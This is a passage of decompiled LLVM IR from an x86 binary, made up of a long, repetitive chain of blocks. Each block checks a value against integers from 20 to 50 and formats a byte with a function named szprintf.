  store i32 %v2_804a331, i32* @ebx, align 4
  %v4_804a343 = call i32 @szprintf(i32 %v2_804a331, i32 ptrtoint ([11 x i8]* @global_var_8057a46.60 to i32), i32 %v1_804a322)
  br label %dec_label_pc_804a348

dec_label_pc_804a348:                             ; preds = %dec_label_pc_804a312, %dec_label_pc_804a318
  %v13_804a348 = icmp eq i32 %v2_8049efa, 20
  %v1_804a34c = icmp eq i1 %v13_804a348, false
  br i1 %v1_804a34c, label %dec_label_pc_804a37e, label %dec_label_pc_804a34e

dec_label_pc_804a34e:                             ; preds = %dec_label_pc_804a348
  %v0_804a34e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a34e = zext i8 %v0_804a34e to i32
  store i32 %v1_804a34e, i32* @edx, align 4
  %v0_804a358 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a358 = zext i8 %v0_804a358 to i32
  %v2_804a367 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a367, i32* @ebx, align 4
  %v4_804a379 = call i32 @szprintf(i32 %v2_804a367, i32 ptrtoint ([12 x i8]* @global_var_8057a51.61 to i32), i32 %v1_804a358)
  br label %dec_label_pc_804a37e

dec_label_pc_804a37e:                             ; preds = %dec_label_pc_804a348, %dec_label_pc_804a34e
  %v13_804a37e = icmp eq i32 %v2_8049efa, 21
  %v1_804a382 = icmp eq i1 %v13_804a37e, false
  br i1 %v1_804a382, label %dec_label_pc_804a3b4, label %dec_label_pc_804a384

dec_label_pc_804a384:                             ; preds = %dec_label_pc_804a37e
  %v0_804a384 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a384 = zext i8 %v0_804a384 to i32
  store i32 %v1_804a384, i32* @edx, align 4
  %v0_804a38e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a38e = zext i8 %v0_804a38e to i32
  %v2_804a39d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a39d, i32* @ebx, align 4
  %v4_804a3af = call i32 @szprintf(i32 %v2_804a39d, i32 ptrtoint ([13 x i8]* @global_var_8057a5d.62 to i32), i32 %v1_804a38e)
  br label %dec_label_pc_804a3b4

dec_label_pc_804a3b4:                             ; preds = %dec_label_pc_804a37e, %dec_label_pc_804a384
  %v13_804a3b4 = icmp eq i32 %v2_8049efa, 22
  %v1_804a3b8 = icmp eq i1 %v13_804a3b4, false
  br i1 %v1_804a3b8, label %dec_label_pc_804a3ea, label %dec_label_pc_804a3ba

dec_label_pc_804a3ba:                             ; preds = %dec_label_pc_804a3b4
  %v0_804a3ba = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a3ba = zext i8 %v0_804a3ba to i32
  store i32 %v1_804a3ba, i32* @edx, align 4
  %v0_804a3c4 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a3c4 = zext i8 %v0_804a3c4 to i32
  %v2_804a3d3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3d3, i32* @ebx, align 4
  %v4_804a3e5 = call i32 @szprintf(i32 %v2_804a3d3, i32 ptrtoint ([11 x i8]* @global_var_8057a6a.63 to i32), i32 %v1_804a3c4)
  br label %dec_label_pc_804a3ea

dec_label_pc_804a3ea:                             ; preds = %dec_label_pc_804a3b4, %dec_label_pc_804a3ba
  %v13_804a3ea = icmp eq i32 %v2_8049efa, 23
  %v1_804a3ee = icmp eq i1 %v13_804a3ea, false
  br i1 %v1_804a3ee, label %dec_label_pc_804a420, label %dec_label_pc_804a3f0

dec_label_pc_804a3f0:                             ; preds = %dec_label_pc_804a3ea
  %v0_804a3f0 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a3f0 = zext i8 %v0_804a3f0 to i32
  store i32 %v1_804a3f0, i32* @edx, align 4
  %v0_804a3fa = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a3fa = zext i8 %v0_804a3fa to i32
  %v2_804a409 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a409, i32* @ebx, align 4
  %v4_804a41b = call i32 @szprintf(i32 %v2_804a409, i32 ptrtoint ([11 x i8]* @global_var_8057a75.64 to i32), i32 %v1_804a3fa)
  br label %dec_label_pc_804a420

dec_label_pc_804a420:                             ; preds = %dec_label_pc_804a3ea, %dec_label_pc_804a3f0
  %v13_804a420 = icmp eq i32 %v2_8049efa, 24
  %v1_804a424 = icmp eq i1 %v13_804a420, false
  br i1 %v1_804a424, label %dec_label_pc_804a456, label %dec_label_pc_804a426

dec_label_pc_804a426:                             ; preds = %dec_label_pc_804a420
  %v0_804a426 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a426 = zext i8 %v0_804a426 to i32
  store i32 %v1_804a426, i32* @edx, align 4
  %v0_804a430 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a430 = zext i8 %v0_804a430 to i32
  %v2_804a43f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a43f, i32* @ebx, align 4
  %v4_804a451 = call i32 @szprintf(i32 %v2_804a43f, i32 ptrtoint ([12 x i8]* @global_var_8057a80.65 to i32), i32 %v1_804a430)
  br label %dec_label_pc_804a456

dec_label_pc_804a456:                             ; preds = %dec_label_pc_804a420, %dec_label_pc_804a426
  %v13_804a456 = icmp eq i32 %v2_8049efa, 25
  %v1_804a45a = icmp eq i1 %v13_804a456, false
  br i1 %v1_804a45a, label %dec_label_pc_804a48c, label %dec_label_pc_804a45c

dec_label_pc_804a45c:                             ; preds = %dec_label_pc_804a456
  %v0_804a45c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a45c = zext i8 %v0_804a45c to i32
  store i32 %v1_804a45c, i32* @edx, align 4
  %v0_804a466 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a466 = zext i8 %v0_804a466 to i32
  %v2_804a475 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a475, i32* @ebx, align 4
  %v4_804a487 = call i32 @szprintf(i32 %v2_804a475, i32 ptrtoint ([12 x i8]* @global_var_8057a8c.66 to i32), i32 %v1_804a466)
  br label %dec_label_pc_804a48c

dec_label_pc_804a48c:                             ; preds = %dec_label_pc_804a456, %dec_label_pc_804a45c
  %v13_804a48c = icmp eq i32 %v2_8049efa, 26
  %v1_804a490 = icmp eq i1 %v13_804a48c, false
  br i1 %v1_804a490, label %dec_label_pc_804a4c2, label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a48c
  %v0_804a492 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a492 = zext i8 %v0_804a492 to i32
  store i32 %v1_804a492, i32* @edx, align 4
  %v0_804a49c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a49c = zext i8 %v0_804a49c to i32
  %v2_804a4ab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ab, i32* @ebx, align 4
  %v4_804a4bd = call i32 @szprintf(i32 %v2_804a4ab, i32 ptrtoint ([12 x i8]* @global_var_8057a98.67 to i32), i32 %v1_804a49c)
  br label %dec_label_pc_804a4c2

dec_label_pc_804a4c2:                             ; preds = %dec_label_pc_804a48c, %dec_label_pc_804a492
  %v13_804a4c2 = icmp eq i32 %v2_8049efa, 27
  %v1_804a4c6 = icmp eq i1 %v13_804a4c2, false
  br i1 %v1_804a4c6, label %dec_label_pc_804a4f8, label %dec_label_pc_804a4c8

dec_label_pc_804a4c8:                             ; preds = %dec_label_pc_804a4c2
  %v0_804a4c8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a4c8 = zext i8 %v0_804a4c8 to i32
  store i32 %v1_804a4c8, i32* @edx, align 4
  %v0_804a4d2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a4d2 = zext i8 %v0_804a4d2 to i32
  %v2_804a4e1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4e1, i32* @ebx, align 4
  %v4_804a4f3 = call i32 @szprintf(i32 %v2_804a4e1, i32 ptrtoint ([13 x i8]* @global_var_8057aa4.68 to i32), i32 %v1_804a4d2)
  br label %dec_label_pc_804a4f8

dec_label_pc_804a4f8:                             ; preds = %dec_label_pc_804a4c2, %dec_label_pc_804a4c8
  %v13_804a4f8 = icmp eq i32 %v2_8049efa, 28
  %v1_804a4fc = icmp eq i1 %v13_804a4f8, false
  br i1 %v1_804a4fc, label %dec_label_pc_804a52e, label %dec_label_pc_804a4fe

dec_label_pc_804a4fe:                             ; preds = %dec_label_pc_804a4f8
  %v0_804a4fe = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a4fe = zext i8 %v0_804a4fe to i32
  store i32 %v1_804a4fe, i32* @edx, align 4
  %v0_804a508 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a508 = zext i8 %v0_804a508 to i32
  %v2_804a517 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a517, i32* @ebx, align 4
  %v4_804a529 = call i32 @szprintf(i32 %v2_804a517, i32 ptrtoint ([13 x i8]* @global_var_8057ab1.69 to i32), i32 %v1_804a508)
  br label %dec_label_pc_804a52e

dec_label_pc_804a52e:                             ; preds = %dec_label_pc_804a4f8, %dec_label_pc_804a4fe
  %v13_804a52e = icmp eq i32 %v2_8049efa, 29
  %v1_804a532 = icmp eq i1 %v13_804a52e, false
  br i1 %v1_804a532, label %dec_label_pc_804a564, label %dec_label_pc_804a534

dec_label_pc_804a534:                             ; preds = %dec_label_pc_804a52e
  %v0_804a534 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a534 = zext i8 %v0_804a534 to i32
  store i32 %v1_804a534, i32* @edx, align 4
  %v0_804a53e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a53e = zext i8 %v0_804a53e to i32
  %v2_804a54d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a54d, i32* @ebx, align 4
  %v4_804a55f = call i32 @szprintf(i32 %v2_804a54d, i32 ptrtoint ([12 x i8]* @global_var_8057abe.70 to i32), i32 %v1_804a53e)
  br label %dec_label_pc_804a564

dec_label_pc_804a564:                             ; preds = %dec_label_pc_804a52e, %dec_label_pc_804a534
  %v13_804a564 = icmp eq i32 %v2_8049efa, 30
  %v1_804a568 = icmp eq i1 %v13_804a564, false
  br i1 %v1_804a568, label %dec_label_pc_804a59a, label %dec_label_pc_804a56a

dec_label_pc_804a56a:                             ; preds = %dec_label_pc_804a564
  %v0_804a56a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a56a = zext i8 %v0_804a56a to i32
  store i32 %v1_804a56a, i32* @edx, align 4
  %v0_804a574 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a574 = zext i8 %v0_804a574 to i32
  %v2_804a583 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a583, i32* @ebx, align 4
  %v4_804a595 = call i32 @szprintf(i32 %v2_804a583, i32 ptrtoint ([13 x i8]* @global_var_8057aca.71 to i32), i32 %v1_804a574)
  br label %dec_label_pc_804a59a

dec_label_pc_804a59a:                             ; preds = %dec_label_pc_804a564, %dec_label_pc_804a56a
  %v13_804a59a = icmp eq i32 %v2_8049efa, 31
  %v1_804a59e = icmp eq i1 %v13_804a59a, false
  br i1 %v1_804a59e, label %dec_label_pc_804a5d0, label %dec_label_pc_804a5a0

dec_label_pc_804a5a0:                             ; preds = %dec_label_pc_804a59a
  %v0_804a5a0 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a5a0 = zext i8 %v0_804a5a0 to i32
  store i32 %v1_804a5a0, i32* @edx, align 4
  %v0_804a5aa = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a5aa = zext i8 %v0_804a5aa to i32
  %v2_804a5b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5b9, i32* @ebx, align 4
  %v4_804a5cb = call i32 @szprintf(i32 %v2_804a5b9, i32 ptrtoint ([12 x i8]* @global_var_8057ad7.72 to i32), i32 %v1_804a5aa)
  br label %dec_label_pc_804a5d0

dec_label_pc_804a5d0:                             ; preds = %dec_label_pc_804a59a, %dec_label_pc_804a5a0
  %v10_804a5d0 = icmp eq i32 %v2_8049efa, 32
  %v1_804a5d4 = icmp eq i1 %v10_804a5d0, false
  br i1 %v1_804a5d4, label %dec_label_pc_804a606, label %dec_label_pc_804a5d6

dec_label_pc_804a5d6:                             ; preds = %dec_label_pc_804a5d0
  %v0_804a5d6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a5d6 = zext i8 %v0_804a5d6 to i32
  store i32 %v1_804a5d6, i32* @edx, align 4
  %v0_804a5e0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a5e0 = zext i8 %v0_804a5e0 to i32
  %v2_804a5ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5ef, i32* @ebx, align 4
  %v4_804a601 = call i32 @szprintf(i32 %v2_804a5ef, i32 ptrtoint ([11 x i8]* @global_var_8057ae3.73 to i32), i32 %v1_804a5e0)
  br label %dec_label_pc_804a606

dec_label_pc_804a606:                             ; preds = %dec_label_pc_804a5d0, %dec_label_pc_804a5d6
  %v13_804a606 = icmp eq i32 %v2_8049efa, 33
  %v1_804a60a = icmp eq i1 %v13_804a606, false
  br i1 %v1_804a60a, label %dec_label_pc_804a63c, label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a606
  %v0_804a60c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a60c = zext i8 %v0_804a60c to i32
  store i32 %v1_804a60c, i32* @edx, align 4
  %v0_804a616 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a616 = zext i8 %v0_804a616 to i32
  %v2_804a625 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a625, i32* @ebx, align 4
  %v4_804a637 = call i32 @szprintf(i32 %v2_804a625, i32 ptrtoint ([12 x i8]* @global_var_8057aee.74 to i32), i32 %v1_804a616)
  br label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a606, %dec_label_pc_804a60c
  %v13_804a63c = icmp eq i32 %v2_8049efa, 34
  %v1_804a640 = icmp eq i1 %v13_804a63c, false
  br i1 %v1_804a640, label %dec_label_pc_804a672, label %dec_label_pc_804a642

dec_label_pc_804a642:                             ; preds = %dec_label_pc_804a63c
  %v0_804a642 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a642 = zext i8 %v0_804a642 to i32
  store i32 %v1_804a642, i32* @edx, align 4
  %v0_804a64c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a64c = zext i8 %v0_804a64c to i32
  %v2_804a65b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65b, i32* @ebx, align 4
  %v4_804a66d = call i32 @szprintf(i32 %v2_804a65b, i32 ptrtoint ([12 x i8]* @global_var_8057afa.75 to i32), i32 %v1_804a64c)
  br label %dec_label_pc_804a672

dec_label_pc_804a672:                             ; preds = %dec_label_pc_804a63c, %dec_label_pc_804a642
  %v13_804a672 = icmp eq i32 %v2_8049efa, 35
  %v1_804a676 = icmp eq i1 %v13_804a672, false
  br i1 %v1_804a676, label %dec_label_pc_804a6a8, label %dec_label_pc_804a678

dec_label_pc_804a678:                             ; preds = %dec_label_pc_804a672
  %v0_804a678 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a678 = zext i8 %v0_804a678 to i32
  store i32 %v1_804a678, i32* @edx, align 4
  %v0_804a682 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a682 = zext i8 %v0_804a682 to i32
  %v2_804a691 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a691, i32* @ebx, align 4
  %v4_804a6a3 = call i32 @szprintf(i32 %v2_804a691, i32 ptrtoint ([12 x i8]* @global_var_8057b06.76 to i32), i32 %v1_804a682)
  br label %dec_label_pc_804a6a8

dec_label_pc_804a6a8:                             ; preds = %dec_label_pc_804a672, %dec_label_pc_804a678
  %v13_804a6a8 = icmp eq i32 %v2_8049efa, 36
  %v1_804a6ac = icmp eq i1 %v13_804a6a8, false
  br i1 %v1_804a6ac, label %dec_label_pc_804a6de, label %dec_label_pc_804a6ae

dec_label_pc_804a6ae:                             ; preds = %dec_label_pc_804a6a8
  %v0_804a6ae = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a6ae = zext i8 %v0_804a6ae to i32
  store i32 %v1_804a6ae, i32* @edx, align 4
  %v0_804a6b8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a6b8 = zext i8 %v0_804a6b8 to i32
  %v2_804a6c7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6c7, i32* @ebx, align 4
  %v4_804a6d9 = call i32 @szprintf(i32 %v2_804a6c7, i32 ptrtoint ([12 x i8]* @global_var_8057b12.77 to i32), i32 %v1_804a6b8)
  br label %dec_label_pc_804a6de

dec_label_pc_804a6de:                             ; preds = %dec_label_pc_804a6a8, %dec_label_pc_804a6ae
  %v13_804a6de = icmp eq i32 %v2_8049efa, 37
  %v1_804a6e2 = icmp eq i1 %v13_804a6de, false
  br i1 %v1_804a6e2, label %dec_label_pc_804a714, label %dec_label_pc_804a6e4

dec_label_pc_804a6e4:                             ; preds = %dec_label_pc_804a6de
  %v0_804a6e4 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a6e4 = zext i8 %v0_804a6e4 to i32
  store i32 %v1_804a6e4, i32* @edx, align 4
  %v0_804a6ee = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a6ee = zext i8 %v0_804a6ee to i32
  %v2_804a6fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6fd, i32* @ebx, align 4
  %v4_804a70f = call i32 @szprintf(i32 %v2_804a6fd, i32 ptrtoint ([12 x i8]* @global_var_8057b1e.78 to i32), i32 %v1_804a6ee)
  br label %dec_label_pc_804a714

dec_label_pc_804a714:                             ; preds = %dec_label_pc_804a6de, %dec_label_pc_804a6e4
  %v13_804a714 = icmp eq i32 %v2_8049efa, 38
  %v1_804a718 = icmp eq i1 %v13_804a714, false
  br i1 %v1_804a718, label %dec_label_pc_804a74a, label %dec_label_pc_804a71a

dec_label_pc_804a71a:                             ; preds = %dec_label_pc_804a714
  %v0_804a71a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a71a = zext i8 %v0_804a71a to i32
  store i32 %v1_804a71a, i32* @edx, align 4
  %v0_804a724 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a724 = zext i8 %v0_804a724 to i32
  %v2_804a733 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a733, i32* @ebx, align 4
  %v4_804a745 = call i32 @szprintf(i32 %v2_804a733, i32 ptrtoint ([13 x i8]* @global_var_8057b2a.79 to i32), i32 %v1_804a724)
  br label %dec_label_pc_804a74a

dec_label_pc_804a74a:                             ; preds = %dec_label_pc_804a714, %dec_label_pc_804a71a
  %v13_804a74a = icmp eq i32 %v2_8049efa, 39
  %v1_804a74e = icmp eq i1 %v13_804a74a, false
  br i1 %v1_804a74e, label %dec_label_pc_804a780, label %dec_label_pc_804a750

dec_label_pc_804a750:                             ; preds = %dec_label_pc_804a74a
  %v0_804a750 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a750 = zext i8 %v0_804a750 to i32
  store i32 %v1_804a750, i32* @edx, align 4
  %v0_804a75a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a75a = zext i8 %v0_804a75a to i32
  %v2_804a769 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a769, i32* @ebx, align 4
  %v4_804a77b = call i32 @szprintf(i32 %v2_804a769, i32 ptrtoint ([13 x i8]* @global_var_8057b37.80 to i32), i32 %v1_804a75a)
  br label %dec_label_pc_804a780

dec_label_pc_804a780:                             ; preds = %dec_label_pc_804a74a, %dec_label_pc_804a750
  %v13_804a780 = icmp eq i32 %v2_8049efa, 40
  %v1_804a784 = icmp eq i1 %v13_804a780, false
  br i1 %v1_804a784, label %dec_label_pc_804a7b6, label %dec_label_pc_804a786

dec_label_pc_804a786:                             ; preds = %dec_label_pc_804a780
  %v0_804a786 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a786 = zext i8 %v0_804a786 to i32
  store i32 %v1_804a786, i32* @edx, align 4
  %v0_804a790 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a790 = zext i8 %v0_804a790 to i32
  %v2_804a79f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a79f, i32* @ebx, align 4
  %v4_804a7b1 = call i32 @szprintf(i32 %v2_804a79f, i32 ptrtoint ([13 x i8]* @global_var_8057b2a.79 to i32), i32 %v1_804a790)
  br label %dec_label_pc_804a7b6

dec_label_pc_804a7b6:                             ; preds = %dec_label_pc_804a780, %dec_label_pc_804a786
  %v13_804a7b6 = icmp eq i32 %v2_8049efa, 41
  %v1_804a7ba = icmp eq i1 %v13_804a7b6, false
  br i1 %v1_804a7ba, label %dec_label_pc_804a7ec, label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a7b6
  %v0_804a7bc = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a7bc = zext i8 %v0_804a7bc to i32
  store i32 %v1_804a7bc, i32* @edx, align 4
  %v0_804a7c6 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a7c6 = zext i8 %v0_804a7c6 to i32
  %v2_804a7d5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7d5, i32* @ebx, align 4
  %v4_804a7e7 = call i32 @szprintf(i32 %v2_804a7d5, i32 ptrtoint ([11 x i8]* @global_var_8057b44.81 to i32), i32 %v1_804a7c6)
  br label %dec_label_pc_804a7ec

dec_label_pc_804a7ec:                             ; preds = %dec_label_pc_804a7b6, %dec_label_pc_804a7bc
  %v13_804a7ec = icmp eq i32 %v2_8049efa, 42
  %v1_804a7f0 = icmp eq i1 %v13_804a7ec, false
  br i1 %v1_804a7f0, label %dec_label_pc_804a822, label %dec_label_pc_804a7f2

dec_label_pc_804a7f2:                             ; preds = %dec_label_pc_804a7ec
  %v0_804a7f2 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a7f2 = zext i8 %v0_804a7f2 to i32
  store i32 %v1_804a7f2, i32* @edx, align 4
  %v0_804a7fc = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a7fc = zext i8 %v0_804a7fc to i32
  %v2_804a80b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80b, i32* @ebx, align 4
  %v4_804a81d = call i32 @szprintf(i32 %v2_804a80b, i32 ptrtoint ([12 x i8]* @global_var_8057b4f.82 to i32), i32 %v1_804a7fc)
  br label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a7ec, %dec_label_pc_804a7f2
  %v13_804a822 = icmp eq i32 %v2_8049efa, 43
  %v1_804a826 = icmp eq i1 %v13_804a822, false
  br i1 %v1_804a826, label %dec_label_pc_804a858, label %dec_label_pc_804a828

dec_label_pc_804a828:                             ; preds = %dec_label_pc_804a822
  %v0_804a828 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a828 = zext i8 %v0_804a828 to i32
  store i32 %v1_804a828, i32* @edx, align 4
  %v0_804a832 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a832 = zext i8 %v0_804a832 to i32
  %v2_804a841 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a841, i32* @ebx, align 4
  %v4_804a853 = call i32 @szprintf(i32 %v2_804a841, i32 ptrtoint ([13 x i8]* @global_var_8057b5b.83 to i32), i32 %v1_804a832)
  br label %dec_label_pc_804a858

dec_label_pc_804a858:                             ; preds = %dec_label_pc_804a822, %dec_label_pc_804a828
  %v13_804a858 = icmp eq i32 %v2_8049efa, 44
  %v1_804a85c = icmp eq i1 %v13_804a858, false
  br i1 %v1_804a85c, label %dec_label_pc_804a88e, label %dec_label_pc_804a85e

dec_label_pc_804a85e:                             ; preds = %dec_label_pc_804a858
  %v0_804a85e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a85e = zext i8 %v0_804a85e to i32
  store i32 %v1_804a85e, i32* @edx, align 4
  %v0_804a868 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a868 = zext i8 %v0_804a868 to i32
  %v2_804a877 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a877, i32* @ebx, align 4
  %v4_804a889 = call i32 @szprintf(i32 %v2_804a877, i32 ptrtoint ([12 x i8]* @global_var_8057b68.84 to i32), i32 %v1_804a868)
  br label %dec_label_pc_804a88e

dec_label_pc_804a88e:                             ; preds = %dec_label_pc_804a858, %dec_label_pc_804a85e
  %v13_804a88e = icmp eq i32 %v2_8049efa, 45
  %v1_804a892 = icmp eq i1 %v13_804a88e, false
  br i1 %v1_804a892, label %dec_label_pc_804a8c4, label %dec_label_pc_804a894

dec_label_pc_804a894:                             ; preds = %dec_label_pc_804a88e
  %v0_804a894 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a894 = zext i8 %v0_804a894 to i32
  store i32 %v1_804a894, i32* @edx, align 4
  %v0_804a89e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a89e = zext i8 %v0_804a89e to i32
  %v2_804a8ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ad, i32* @ebx, align 4
  %v4_804a8bf = call i32 @szprintf(i32 %v2_804a8ad, i32 ptrtoint ([13 x i8]* @global_var_8057b74.85 to i32), i32 %v1_804a89e)
  br label %dec_label_pc_804a8c4

dec_label_pc_804a8c4:                             ; preds = %dec_label_pc_804a88e, %dec_label_pc_804a894
  %v13_804a8c4 = icmp eq i32 %v2_8049efa, 46
  %v1_804a8c8 = icmp eq i1 %v13_804a8c4, false
  br i1 %v1_804a8c8, label %dec_label_pc_804a8fa, label %dec_label_pc_804a8ca

dec_label_pc_804a8ca:                             ; preds = %dec_label_pc_804a8c4
  %v0_804a8ca = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a8ca = zext i8 %v0_804a8ca to i32
  store i32 %v1_804a8ca, i32* @edx, align 4
  %v0_804a8d4 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a8d4 = zext i8 %v0_804a8d4 to i32
  %v2_804a8e3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8e3, i32* @ebx, align 4
  %v4_804a8f5 = call i32 @szprintf(i32 %v2_804a8e3, i32 ptrtoint ([13 x i8]* @global_var_8057b81.86 to i32), i32 %v1_804a8d4)
  br label %dec_label_pc_804a8fa

dec_label_pc_804a8fa:                             ; preds = %dec_label_pc_804a8c4, %dec_label_pc_804a8ca
  %v13_804a8fa = icmp eq i32 %v2_8049efa, 47
  %v1_804a8fe = icmp eq i1 %v13_804a8fa, false
  br i1 %v1_804a8fe, label %dec_label_pc_804a930, label %dec_label_pc_804a900

dec_label_pc_804a900:                             ; preds = %dec_label_pc_804a8fa
  %v0_804a900 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a900 = zext i8 %v0_804a900 to i32
  store i32 %v1_804a900, i32* @edx, align 4
  %v0_804a90a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a90a = zext i8 %v0_804a90a to i32
  %v2_804a919 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a919, i32* @ebx, align 4
  %v4_804a92b = call i32 @szprintf(i32 %v2_804a919, i32 ptrtoint ([13 x i8]* @global_var_8057b8e.87 to i32), i32 %v1_804a90a)
  br label %dec_label_pc_804a930

dec_label_pc_804a930:                             ; preds = %dec_label_pc_804a8fa, %dec_label_pc_804a900
  %v10_804a930 = icmp eq i32 %v2_8049efa, 48
  %v1_804a934 = icmp eq i1 %v10_804a930, false
  br i1 %v1_804a934, label %dec_label_pc_804a966, label %dec_label_pc_804a936

dec_label_pc_804a936:                             ; preds = %dec_label_pc_804a930
  %v0_804a936 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a936 = zext i8 %v0_804a936 to i32
  store i32 %v1_804a936, i32* @edx, align 4
  %v0_804a940 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a940 = zext i8 %v0_804a940 to i32
  %v2_804a94f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a94f, i32* @ebx, align 4
  %v4_804a961 = call i32 @szprintf(i32 %v2_804a94f, i32 ptrtoint ([12 x i8]* @global_var_8057b9b.88 to i32), i32 %v1_804a940)
  br label %dec_label_pc_804a966

dec_label_pc_804a966:                             ; preds = %dec_label_pc_804a930, %dec_label_pc_804a936
  %v13_804a966 = icmp eq i32 %v2_8049efa, 49
  %v1_804a96a = icmp eq i1 %v13_804a966, false
  br i1 %v1_804a96a, label %dec_label_pc_804a99c, label %dec_label_pc_804a96c

dec_label_pc_804a96c:                             ; preds = %dec_label_pc_804a966
  %v0_804a96c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a96c = zext i8 %v0_804a96c to i32
  store i32 %v1_804a96c, i32* @edx, align 4
  %v0_804a976 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a976 = zext i8 %v0_804a976 to i32
  %v2_804a985 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a985, i32* @ebx, align 4
  %v4_804a997 = call i32 @szprintf(i32 %v2_804a985, i32 ptrtoint ([12 x i8]* @global_var_8057ba7.89 to i32), i32 %v1_804a976)
  br label %dec_label_pc_804a99c

dec_label_pc_804a99c:                             ; preds = %dec_label_pc_804a966, %dec_label_pc_804a96c
  %v13_804a99c = icmp eq i32 %v2_8049efa, 50
  %v1_804a9a0 = icmp eq i1 %v13_804a99c, false
  br i1 %v1_804a9a0, label %dec_label_pc_804a9d2, label %dec_label_pc_804a9a2

dec_label_pc_804a9a2:                             ; preds = %dec_label_pc_804a99c
  %v0_804a9a2 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a9a2 = zext i8 %v0_804a9a2 to i32
